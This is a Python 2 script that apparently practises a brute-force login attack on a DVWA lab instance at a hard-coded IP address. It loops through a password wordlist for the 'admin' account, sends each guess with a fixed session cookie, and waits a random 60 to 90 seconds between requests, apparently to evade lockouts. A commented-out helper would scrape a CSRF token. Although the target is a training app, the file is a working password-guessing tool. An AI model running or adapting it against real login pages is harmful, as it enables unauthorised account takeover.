from bs4 import BeautifulSoup
import urllib2
import os
import time
import random
header={'Host': '161.189.169.253:8180',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://161.189.169.253:8180/DVWA-master/vulnerabilities/brute/?username=admin&password=password&Login=Login',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=low; cookiesession1=1D217F9BIDVFR2LT4LD7CDIEYPWV7493; PHPSESSID=e42110ea2fdbaab1ddb70dfc92058c79'}
requrl = "http://161.189.169.253:8180/DVWA-master/vulnerabilities/brute/"


#def get_token(requrl,header):
	#req = urllib2.Request(url=requrl,headers=header)
	#response = urllib2.urlopen(req)
	#print response.getcode(),
	#the_page = response.read()
	#print len(the_page)
	#soup = BeautifulSoup(the_page,"html.parser")
	#user_token = soup.form.input.input.input.input["value"] #get the user_token
	#return user_token
def get_code(requrl,header):
	req = urllib2.Request(url=requrl, headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
#user_token = get_token(requrl,header)
i=0
for line in open("password.txt"):
	requrl = "http://161.189.169.253:8180/DVWA-master/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login"
	rt = random.randint(60,90)
	time.sleep(rt)
	i = i+1
	print i,'admin',line.strip(),
	code = get_code(requrl,header)
	#user_token = get_token(requrl,header)
	#if (i == 20):
		#break